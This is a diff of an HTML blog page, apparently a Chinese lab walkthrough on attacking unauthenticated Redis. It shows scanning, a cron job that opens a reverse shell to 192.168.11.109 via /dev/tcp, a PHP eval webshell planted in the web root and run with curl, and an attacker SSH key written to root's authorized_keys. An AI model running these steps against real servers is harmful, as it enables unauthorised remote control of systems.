@@ -385,7 +385,7 @@ OK
 <meta property="og:url" content="https://P7IVESC.github.io/post/Redis-shen-tou.html">
 <meta property="og:image" content="https://avatars.githubusercontent.com/u/237383456?v=4&size=200">
 <title>Redis渗透</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -454,68 +454,59 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <div class="markdown-body" id="postBody"><h2>Redis未授权访问漏洞</h2>
 <h2>Redis本地检查</h2>
 <p>在本地使用redis-cli连接</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">redis-cli
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">redis-cli</pre></div>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5de9e98dfbc78f016ae201071f3ca7cceca70ae21847abdd47f9254a6a331710/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3039663138306135656638622e706e67"><img src="https://camo.githubusercontent.com/5de9e98dfbc78f016ae201071f3ca7cceca70ae21847abdd47f9254a6a331710/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3039663138306135656638622e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/09f180a5ef8b.png" style="max-width: 100%;"></a></p>
 <p>检查配置项</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">config get requirepass
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">config get requirepass</pre></div>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2fe85c2648618dc05da2a6870dc3e1458dc3f28aa4355c46059c16e552504dd2/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3065373433343733313537352e706e67"><img src="https://camo.githubusercontent.com/2fe85c2648618dc05da2a6870dc3e1458dc3f28aa4355c46059c16e552504dd2/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3065373433343733313537352e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/0e7434731575.png" style="max-width: 100%;"></a></p>
 <h2>curl命令测试</h2>
-<pre lang="bash" class="notranslate"><code class="notranslate">curl dict://10.3.4.101:6379/info
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">curl dict://10.3.4.101:6379/info</pre></div>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4d6defc16586f31a2487086b47cf1f44733a4b3e4c1b86899e5b5c168e125193/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3931336439316536356166642e77656270"><img src="https://camo.githubusercontent.com/4d6defc16586f31a2487086b47cf1f44733a4b3e4c1b86899e5b5c168e125193/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3931336439316536356166642e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/913d91e65afd.webp" style="max-width: 100%;"></a></p>
 <h2>客户端访问测试</h2>
-<pre lang="bash" class="notranslate"><code class="notranslate">redis-cli -h 10.3.4.101
-get *
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">redis-cli -h 10.3.4.101
+get <span class="pl-k">*</span></pre></div>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/94fad78d62ee66edb53173c80a9b4b992fc2bc61a9667e48582ae793965e9f41/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3138636365623065383336372e77656270"><img src="https://camo.githubusercontent.com/94fad78d62ee66edb53173c80a9b4b992fc2bc61a9667e48582ae793965e9f41/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3138636365623065383336372e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/18cceb0e8367.webp" style="max-width: 100%;"></a></p>
 <h2>fscan扫描测试</h2>
-<pre lang="bash" class="notranslate"><code class="notranslate">.\fscan64.exe -h 10.3.4.101
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">.<span class="pl-cce">\f</span>scan64.exe -h 10.3.4.101</pre></div>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/22dba72d370ff71b0ffbc28bfd37c53edaa92545d0f955f27c0a6a6238eca3c4/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6235373134633532613939662e706e67"><img src="https://camo.githubusercontent.com/22dba72d370ff71b0ffbc28bfd37c53edaa92545d0f955f27c0a6a6238eca3c4/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6235373134633532613939662e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/b5714c52a99f.png" style="max-width: 100%;"></a></p>
 <h2>msf扫描测试</h2>
-<pre lang="bash" class="notranslate"><code class="notranslate">use auxiliary/scanner/redis/redis_login
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">use auxiliary/scanner/redis/redis_login</pre></div>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ba8b6007a6c0335f93945de000b9ba6da4fdb6abf1e3cc72201a71caf4c92002/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3363363934643763353433382e706e67"><img src="https://camo.githubusercontent.com/ba8b6007a6c0335f93945de000b9ba6da4fdb6abf1e3cc72201a71caf4c92002/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3363363934643763353433382e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3c694d7c5438.png" style="max-width: 100%;"></a></p>
 <h2>Redis反弹shell</h2>
 <p><strong>1.本地开启端口监听</strong></p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e7c5832c64945c51033d8a8bd973b345909295f3031e0e6a80af2a962de0106d/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6463643339346434393031622e706e67"><img src="https://camo.githubusercontent.com/e7c5832c64945c51033d8a8bd973b345909295f3031e0e6a80af2a962de0106d/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6463643339346434393031622e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/dcd394d4901b.png" style="max-width: 100%;"></a></p>
 <p><strong>2.通过Redis写入功能将反弹shell写入定时任务中</strong></p>
-<pre lang="sql" class="notranslate"><code class="notranslate">flushall
---清除所有数据库的所有key
-set x "\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.11.109/1234 0&gt;&amp;1\n"
---创建一个key-value对，键名为“x”，值为要写入的定时任务的内容
-config set dir /var/spool/cron
---指定数据存储的路径
-config set dbfilename root
---指定数据存储的文件名
+<div class="highlight highlight-source-sql"><pre class="notranslate">flushall
+<span class="pl-c"><span class="pl-c">--</span>清除所有数据库的所有key</span>
+<span class="pl-k">set</span> x <span class="pl-s"><span class="pl-pds">"</span>\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.11.109/1234 0&gt;&amp;1\n<span class="pl-pds">"</span></span>
+<span class="pl-c"><span class="pl-c">--</span>创建一个key-value对，键名为“x”，值为要写入的定时任务的内容</span>
+config <span class="pl-k">set</span> dir <span class="pl-k">/</span>var<span class="pl-k">/</span>spool<span class="pl-k">/</span>cron
+<span class="pl-c"><span class="pl-c">--</span>指定数据存储的路径</span>
+config <span class="pl-k">set</span> dbfilename root
+<span class="pl-c"><span class="pl-c">--</span>指定数据存储的文件名</span>
 save
---存储数据
-</code></pre>
+<span class="pl-c"><span class="pl-c">--</span>存储数据</span></pre></div>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e1f1d91afa774d3fe2cc41d665148d05c2182f2a71c889f7d1656c98d2d790ed/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3330303065316234343637322e706e67"><img src="https://camo.githubusercontent.com/e1f1d91afa774d3fe2cc41d665148d05c2182f2a71c889f7d1656c98d2d790ed/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3330303065316234343637322e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3000e1b44672.png" style="max-width: 100%;"></a></p>
 <p><strong>3.接收到shell</strong></p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/fcb02f4886e9fbce88be849ab30ccb8c62c8aea612e23195a9d9a52e0bd8eb6a/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6364656337636335356237352e77656270"><img src="https://camo.githubusercontent.com/fcb02f4886e9fbce88be849ab30ccb8c62c8aea612e23195a9d9a52e0bd8eb6a/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6364656337636335356237352e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/cdec7cc55b75.webp" style="max-width: 100%;"></a></p>
 <h2>Redis写入Webshell</h2>
 <p><strong>通过Redis将webshell写入Web目录下</strong></p>
-<pre lang="bash" class="notranslate"><code class="notranslate">redis-cli -h 10.3.4.129
-10.3.4.129:6379&gt; set webshell "\n\n\n&lt;?php eval($_REQUEST[1]); ?&gt;\n"
+<div class="highlight highlight-source-shell"><pre class="notranslate">redis-cli -h 10.3.4.129
+10.3.4.129:<span class="pl-k">6379&gt;</span> <span class="pl-c1">set</span> webshell <span class="pl-s"><span class="pl-pds">"</span>\n\n\n&lt;?php eval(<span class="pl-smi">$_REQUEST</span>[1]); ?&gt;\n<span class="pl-pds">"</span></span>
 OK
 (3.15s)
-10.3.4.129:6379&gt; config set dir /var/www/html
+10.3.4.129:<span class="pl-k">6379&gt;</span> config <span class="pl-c1">set</span> dir /var/www/html
 OK
-10.3.4.129:6379&gt; config set dbfilename shell.php
+10.3.4.129:<span class="pl-k">6379&gt;</span> config <span class="pl-c1">set</span> dbfilename shell.php
 OK
 (2.93s)
-10.3.4.129:6379&gt; save
+10.3.4.129:<span class="pl-k">6379&gt;</span> save
 OK
 (0.78s)
-10.3.4.129:6379&gt; exit
-</code></pre>
+10.3.4.129:<span class="pl-k">6379&gt;</span> <span class="pl-c1">exit</span></pre></div>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/67a4b1023c05368963d091b7f1655e1b44346b4f3214eef78bab22c94be87f83/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3937363136323831613634642e706e67"><img src="https://camo.githubusercontent.com/67a4b1023c05368963d091b7f1655e1b44346b4f3214eef78bab22c94be87f83/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3937363136323831613634642e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/97616281a64d.png" style="max-width: 100%;"></a></p>
 <p><strong>访问Webshell并执行命令</strong></p>
-<pre lang="bash" class="notranslate"><code class="notranslate">curl "http://10.3.4.129/shell.php?1=system('id');" --output -
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">curl <span class="pl-s"><span class="pl-pds">"</span>http://10.3.4.129/shell.php?1=system('id');<span class="pl-pds">"</span></span> --output -</pre></div>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3517a4c79099466d9ca28c7b094cd28d7a27c17a13316c18b3551c762e914b83/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3733626433336332383438322e706e67"><img src="https://camo.githubusercontent.com/3517a4c79099466d9ca28c7b094cd28d7a27c17a13316c18b3551c762e914b83/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3733626433336332383438322e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/73bd33c28482.png" style="max-width: 100%;"></a></p>
 <h2>Redis SSH公钥利用</h2>
 <h2>SSH登录方式</h2>
@@ -532,21 +523,19 @@ OK
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/132f79fcee8c08243b6796985c31c5a76d89a95c0569ac8812afb18137367a4d/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6138303264303862356233392e706e67"><img src="https://camo.githubusercontent.com/132f79fcee8c08243b6796985c31c5a76d89a95c0569ac8812afb18137367a4d/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6138303264303862356233392e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a802d08b5b39.png" style="max-width: 100%;"></a></p>
 <h2>写入SSH公钥</h2>
 <p>通过Redis将SSH公钥写入authorized_keys文件中</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">cat /root/.ssh/id_ed25519.pub
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">cat /root/.ssh/id_ed25519.pub</pre></div>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/12b294dce411437fed379a3bd3c89b42a6f772366a7a7143c8bc0879993ff82c/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3962306665643130373261642e706e67"><img src="https://camo.githubusercontent.com/12b294dce411437fed379a3bd3c89b42a6f772366a7a7143c8bc0879993ff82c/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3962306665643130373261642e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9b0fed1072ad.png" style="max-width: 100%;"></a></p>
-<pre lang="bash" class="notranslate"><code class="notranslate">redis-cli -h 10.3.4.131
-10.3.4.131:6379&gt; config set dir /root/.ssh
+<div class="highlight highlight-source-shell"><pre class="notranslate">redis-cli -h 10.3.4.131
+10.3.4.131:<span class="pl-k">6379&gt;</span> config <span class="pl-c1">set</span> dir /root/.ssh
 OK
 (1.98s)
-10.3.4.131:6379&gt; config set dbfilename authorized_keys
+10.3.4.131:<span class="pl-k">6379&gt;</span> config <span class="pl-c1">set</span> dbfilename authorized_keys
 OK
-10.3.4.131:6379&gt; set x "\n\n\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIATN5mrkJygxFDJ5hvlNFGyFxV65soDbpwQjxHhcU17Q root@kali\n\n"
+10.3.4.131:<span class="pl-k">6379&gt;</span> <span class="pl-c1">set</span> x <span class="pl-s"><span class="pl-pds">"</span>\n\n\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIATN5mrkJygxFDJ5hvlNFGyFxV65soDbpwQjxHhcU17Q root@kali\n\n<span class="pl-pds">"</span></span>
 OK
-10.3.4.131:6379&gt; save
+10.3.4.131:<span class="pl-k">6379&gt;</span> save
 OK
-10.3.4.131:6379&gt;
-</code></pre>
+10.3.4.131:<span class="pl-k">6379&gt;</span></pre></div>
 <pre class="notranslate"><code class="notranslate">由于公用靶场容易影响，后面是本地部署靶场，命令相同
 </code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/7a2b846f8ff8145f35de2ff7e1a13b31a2c43539d0d472efed0ed17d062356ef/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3933316136356335326138302e77656270"><img src="https://camo.githubusercontent.com/7a2b846f8ff8145f35de2ff7e1a13b31a2c43539d0d472efed0ed17d062356ef/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3933316136356335326138302e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/931a65c52a80.webp" style="max-width: 100%;"></a></p>
